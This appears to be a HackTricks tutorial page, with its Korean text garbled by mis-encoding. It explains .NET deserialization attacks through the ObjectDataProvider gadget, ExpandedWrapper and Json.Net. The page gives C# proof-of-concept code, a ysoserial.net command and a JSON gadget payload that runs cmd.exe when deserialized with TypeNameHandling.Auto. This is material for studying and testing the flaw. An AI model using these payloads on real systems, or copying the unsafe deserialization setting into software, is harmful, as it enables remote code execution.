# ê¸°ë³¸ .Net ì—­ì§ë ¬í™” (ObjectDataProvider ê°€ì ¯, ExpandedWrapper ë° Json.Net)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ë¥¼ í†µí•´ ì œë¡œë¶€í„° ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬**ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”? **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”**? ë˜ëŠ” **PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•´ë³´ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•´ë³´ì„¸ìš”, ì €í¬ì˜ ë…ì  [**NFT ì»¬ë ‰ì…˜**](https://opensea.io/collection/the-peass-family)
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™¹**](https://peass.creator-spring.com)ì„ ë°›ì•„ë³´ì„¸ìš”
* **ğŸ’¬** [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ê³  ì‹¶ìœ¼ì‹œë‹¤ë©´** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ë°** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ë¡œ PRì„ ì œì¶œ**í•´ì£¼ì„¸ìš”.

</details>

ì´ ê²Œì‹œë¬¼ì€ **ObjectDataProvider ê°€ì ¯ì´ ì–´ë–»ê²Œ ì•…ìš©ë˜ì–´ RCEë¥¼ ì–»ëŠ”ì§€**ì™€ Serialization ë¼ì´ë¸ŒëŸ¬ë¦¬ **Json.Net ë° xmlSerializerê°€ ê·¸ ê°€ì ¯ê³¼ í•¨ê»˜ ì•…ìš©ë  ìˆ˜ ìˆëŠ” ë°©ë²•ì„ ì´í•´í•˜ëŠ” ë°** ì „ë…ë˜ì–´ ìˆìŠµë‹ˆë‹¤.

## ObjectDataProvider ê°€ì ¯

ë¬¸ì„œì—ì„œ: _ObjectDataProvider í´ë˜ìŠ¤ëŠ” ë°”ì¸ë”© ì†ŒìŠ¤ë¡œ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ê°ì²´ë¥¼ ë˜í•‘í•˜ê³  ìƒì„±í•©ë‹ˆë‹¤_.\
ê·¸ë˜, ì´ìƒí•œ ì„¤ëª…ì´ì£ . ê·¸ë˜ì„œ ì´ í´ë˜ìŠ¤ê°€ í¥ë¯¸ë¡œìš´ ì´ìœ ëŠ” ë¬´ì—‡ì¸ì§€ ì‚´í´ë´…ì‹œë‹¤: ì´ í´ë˜ìŠ¤ëŠ” **ì„ì˜ì˜ ê°ì²´ë¥¼ ë˜í•‘**í•˜ê³ , _**MethodParameters**_ë¥¼ ì‚¬ìš©í•˜ì—¬ **ì„ì˜ì˜ ë§¤ê°œë³€ìˆ˜ë¥¼ ì„¤ì •**í•˜ê³ , ê·¸ëŸ° ë‹¤ìŒ **MethodNameì„ ì‚¬ìš©í•˜ì—¬ ì„ì˜ì˜ í•¨ìˆ˜ë¥¼ í˜¸ì¶œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë”°ë¼ì„œ, ì„ì˜ì˜ **ê°ì²´**ëŠ” **ì—­ì§ë ¬í™”ë  ë•Œ** **ë§¤ê°œë³€ìˆ˜ì™€ í•¨ê»˜ í•¨ìˆ˜ë¥¼ ì‹¤í–‰**í•  ê²ƒì…ë‹ˆë‹¤.

### **ì´ê²ƒì´ ì–´ë–»ê²Œ ê°€ëŠ¥í•œê°€ìš”**

**System.Windows.Data** ë„¤ì„ìŠ¤í˜ì´ìŠ¤ëŠ” **PresentationFramework.dll**ì— ìˆìœ¼ë©° `C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF`ì—ì„œ ObjectDataProviderê°€ ì •ì˜ë˜ê³  êµ¬í˜„ë©ë‹ˆë‹¤.

[**dnSpy**](https://github.com/0xd4d/dnSpy)ë¥¼ ì‚¬ìš©í•˜ì—¬ ê´€ì‹¬ ìˆëŠ” í´ë˜ìŠ¤ì˜ ì½”ë“œë¥¼ **ê²€ì‚¬**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì•„ë˜ ì´ë¯¸ì§€ì—ì„œ ìš°ë¦¬ëŠ” **PresentationFramework.dll --> System.Windows.Data --> ObjectDataProvider --> Method name**ì˜ ì½”ë“œë¥¼ ë³´ê³  ìˆìŠµë‹ˆë‹¤.

![](<../../.gitbook/assets/image (427).png>)

`MethodName`ì´ ì„¤ì •ë˜ë©´ `base.Refresh()`ê°€ í˜¸ì¶œë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ê²ƒì´ ë¬´ì—‡ì„ í•˜ëŠ”ì§€ ì‚´í´ë´…ì‹œë‹¤:

![](<../../.gitbook/assets/image (319).png>)

ì¢‹ì•„ìš”, `this.BeginQuery()`ê°€ ë¬´ì—‡ì„ í•˜ëŠ”ì§€ ê³„ì† ì‚´í´ë´…ì‹œë‹¤. `BeginQuery`ëŠ” `ObjectDataProvider`ì— ì˜í•´ ì¬ì •ì˜ë˜ë©° ë‹¤ìŒì„ ìˆ˜í–‰í•©ë‹ˆë‹¤:

![](<../../.gitbook/assets/image (345).png>)

ì½”ë“œ ëì—ì„œ `this.QueryWorke(null)`ë¥¼ í˜¸ì¶œí•˜ëŠ” ê²ƒì„ ì£¼ëª©í•˜ì„¸ìš”. ì´ê²ƒì´ ë¬´ì—‡ì„ ì‹¤í–‰í•˜ëŠ”ì§€ ì‚´í´ë´…ì‹œë‹¤:

![](<../../.gitbook/assets/image (596).png>)

ì´ê²ƒì´ `QueryWorker` í•¨ìˆ˜ì˜ ì „ì²´ ì½”ë“œëŠ” ì•„ë‹ˆì§€ë§Œ, ê·¸ ì¤‘ìš”í•œ ë¶€ë¶„ì„ ë³´ì—¬ì¤ë‹ˆë‹¤: ì½”ë“œëŠ” **`this.InvokeMethodOnInstance(out ex);`ë¥¼ í˜¸ì¶œ**í•˜ëŠ”ë°, ì´ê²ƒì´ **ì„¤ì •ëœ ë©”ì†Œë“œê°€ í˜¸ì¶œë˜ëŠ”** ë¼ì¸ì…ë‹ˆë‹¤.

_**MethodName**_ë§Œ ì„¤ì •í•˜ë©´ ì‹¤í–‰ëœë‹¤ëŠ” ê²ƒì„ í™•ì¸í•˜ê³  ì‹¶ë‹¤ë©´, ë‹¤ìŒ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```java
using System.Windows.Data;
using System.Diagnostics;

namespace ODPCustomSerialExample
{
class Program
{
static void Main(string[] args)
{
ObjectDataProvider myODP = new ObjectDataProvider();
myODP.ObjectType = typeof(Process);
myODP.MethodParameters.Add("cmd.exe");
myODP.MethodParameters.Add("/c calc.exe");
myODP.MethodName = "Start";
}
}
}
```
ì°¸ê³ ë¡œ `System.Windows.Data`ë¥¼ ë¡œë“œí•˜ê¸° ìœ„í•´ _C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF\PresentationFramework.dll_ì„ ì¶”ê°€í•´ì•¼ í•©ë‹ˆë‹¤.

## ExpandedWrapper

ì´ì „ exploitì„ ì‚¬ìš©í•˜ë©´ **object**ê°€ _**ObjectDataProvider**_ ì¸ìŠ¤í„´ìŠ¤ë¡œ **ì—­ì§ë ¬í™”ë ** ê²½ìš°ê°€ ìˆìŠµë‹ˆë‹¤ (ì˜ˆ: DotNetDuke ì·¨ì•½ì ì—ì„œëŠ” XmlSerializerë¥¼ ì‚¬ìš©í•˜ì—¬ `GetType`ì„ ì‚¬ìš©í•˜ì—¬ objectê°€ ì—­ì§ë ¬í™”ë˜ì—ˆìŠµë‹ˆë‹¤). ê·¸ëŸ° ë‹¤ìŒ, _ObjectDataProvider_ ì¸ìŠ¤í„´ìŠ¤ì— **ê°ì‹¸ì¸ object typeì— ëŒ€í•œ ì§€ì‹ì´ ì—†ì„ ê²ƒ**ì…ë‹ˆë‹¤ (`Process` ì˜ˆë¥¼ ë“¤ì–´). [DotNetDuke ì·¨ì•½ì ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” ì—¬ê¸°ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤](https://translate.google.com/translate?hl=en\&sl=auto\&tl=en\&u=https%3A%2F%2Fpaper.seebug.org%2F365%2F\&sandbox=1).

ì´ í´ë˜ìŠ¤ëŠ” ì£¼ì–´ì§„ ì¸ìŠ¤í„´ìŠ¤ì— **ìº¡ìŠí™”ëœ object typesë¥¼ ì§€ì •**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ, ì´ í´ë˜ìŠ¤ëŠ” ì†ŒìŠ¤ object (_ObjectDataProvider_)ë¥¼ ìƒˆë¡œìš´ object typeìœ¼ë¡œ ìº¡ìŠí™”í•˜ê³  í•„ìš”í•œ ì†ì„±ë“¤ì„ ì œê³µí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (_ObjectDataProvider.MethodName_ ë° _ObjectDataProvider.MethodParameters_).\
ì´ì „ì— ì œì‹œëœ ê²½ìš°ì™€ ê°™ì´ ë§¤ìš° ìœ ìš©í•©ë‹ˆë‹¤. ì™œëƒí•˜ë©´ ìš°ë¦¬ëŠ” **\_ObjectDataProvider**_\*\*ë¥¼ \*\*_**ExpandedWrapper** \_ ì¸ìŠ¤í„´ìŠ¤ ë‚´ë¶€ì— **ê°ìŒ€** ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ì´ í´ë˜ìŠ¤ê°€ **ì—­ì§ë ¬í™”ë  ë•Œ** _**MethodName**_ì— ì§€ì •ëœ **í•¨ìˆ˜**ë¥¼ **ì‹¤í–‰**í•  _**OjectDataProvider**_ objectë¥¼ **ìƒì„±**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë‹¤ìŒ ì½”ë“œë¡œ ì´ wrapperë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```java
using System.Windows.Data;
using System.Diagnostics;
using System.Data.Services.Internal;

namespace ODPCustomSerialExample
{
class Program
{
static void Main(string[] args)
{
ExpandedWrapper<Process, ObjectDataProvider> myExpWrap = new ExpandedWrapper<Process, ObjectDataProvider>();
myExpWrap.ProjectedProperty0 = new ObjectDataProvider();
myExpWrap.ProjectedProperty0.ObjectInstance = new Process();
myExpWrap.ProjectedProperty0.MethodParameters.Add("cmd.exe");
myExpWrap.ProjectedProperty0.MethodParameters.Add("/c calc.exe");
myExpWrap.ProjectedProperty0.MethodName = "Start";
}
}
}
```
## Json.Net

[ê³µì‹ ì›¹ í˜ì´ì§€](https://www.newtonsoft.com/json)ì—ëŠ” ì´ ë¼ì´ë¸ŒëŸ¬ë¦¬ê°€ **Json.NETì˜ ê°•ë ¥í•œ JSON ì§ë ¬í™”ê¸°ë¥¼ ì‚¬ìš©í•˜ì—¬ .NET ê°ì²´ë¥¼ ì§ë ¬í™” ë° ì—­ì§ë ¬í™”**í•  ìˆ˜ ìˆë‹¤ê³  ë‚˜ì™€ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ, ë§Œì•½ ìš°ë¦¬ê°€ **ObjectDataProvider ê°€ì ¯ì„ ì—­ì§ë ¬í™”**í•  ìˆ˜ ìˆë‹¤ë©´, ê°ì²´ë¥¼ ì—­ì§ë ¬í™”í•¨ìœ¼ë¡œì¨ **RCE**ë¥¼ ìœ ë°œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Json.Net ì˜ˆì œ

ë¨¼ì € ì´ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ê°ì²´ë¥¼ **ì§ë ¬í™”/ì—­ì§ë ¬í™”**í•˜ëŠ” ì˜ˆì œë¥¼ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤:
```java
using System;
using Newtonsoft.Json;
using System.Diagnostics;
using System.Collections.Generic;

namespace DeserializationTests
{
public class Account
{
public string Email { get; set; }
public bool Active { get; set; }
public DateTime CreatedDate { get; set; }
public IList<string> Roles { get; set; }
}
class Program
{
static void Main(string[] args)
{
Account account = new Account
{
Email = "james@example.com",
Active = true,
CreatedDate = new DateTime(2013, 1, 20, 0, 0, 0, DateTimeKind.Utc),
Roles = new List<string>
{
"User",
"Admin"
}
};
//Serialize the object and print it
string json = JsonConvert.SerializeObject(account);
Console.WriteLine(json);
//{"Email":"james@example.com","Active":true,"CreatedDate":"2013-01-20T00:00:00Z","Roles":["User","Admin"]}

//Deserialize it
Account desaccount = JsonConvert.DeserializeObject<Account>(json);
Console.WriteLine(desaccount.Email);
}
}
}
```
### Json.Net ë‚¨ìš©

[ysoserial.net](https://github.com/pwntester/ysoserial.net)ì„ ì‚¬ìš©í•˜ì—¬ exploitì„ ìƒì„±í–ˆìŠµë‹ˆë‹¤:
```java
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
{
'$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
'MethodName':'Start',
'MethodParameters':{
'$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
'$values':['cmd', '/c calc.exe']
},
'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```
ì´ ì½”ë“œì—ì„œ **exploitì„ í…ŒìŠ¤íŠ¸**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëƒ¥ ì‹¤í–‰í•˜ë©´ calcê°€ ì‹¤í–‰ë˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```java
using System;
using System.Text;
using Newtonsoft.Json;

namespace DeserializationTests
{
class Program
{
static void Main(string[] args)
{
//Declare exploit
string userdata = @"{
'$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
'MethodName':'Start',
'MethodParameters':{
'$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
'$values':['cmd', '/c calc.exe']
},
'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}";
//Exploit to base64
string userdata_b64 = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(userdata));

//Get data from base64
byte[] userdata_nob64 = Convert.FromBase64String(userdata_b64);
//Deserialize data
string userdata_decoded = Encoding.UTF8.GetString(userdata_nob64);
object obj = JsonConvert.DeserializeObject<object>(userdata_decoded, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
}
}
}
```
<details>

<summary><strong>ì˜ì›¨ì´ì— ëŒ€í•œ ì œë¡œë¶€í„° íˆì–´ë¡œê¹Œì§€ì˜ í•´í‚¹ì„ ë°°ìš°ì„¸ìš”</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”**? **HackTricksì— ê·€ì‚¬ë¥¼ ê´‘ê³ í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”**? í˜¹ì€ **PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•´ë³´ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ì €í¬ì˜ ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”
* **ë‹¤ìŒì— ê°€ì…í•˜ì„¸ìš”** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) í˜¹ì€ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass) ë˜ëŠ” **íŠ¸ìœ„í„°**ì—ì„œ **íŒ”ë¡œìš°**í•˜ì„¸ìš” ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ë°** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)ì— PRì„ ì œì¶œí•¨ìœ¼ë¡œì¨.

</details>
